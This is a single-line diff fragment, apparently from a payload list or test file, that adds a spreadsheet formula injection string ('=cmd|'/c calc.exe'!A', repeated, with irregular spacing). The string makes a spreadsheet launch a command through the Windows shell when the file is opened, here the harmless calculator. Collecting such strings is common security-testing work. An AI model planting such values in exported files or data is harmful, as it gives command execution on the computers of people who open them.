@@ -1,0 +1,1 @@
+27 = cmd | '/ c calc . exe '! A * cmd | '/ c calc . exe '! A
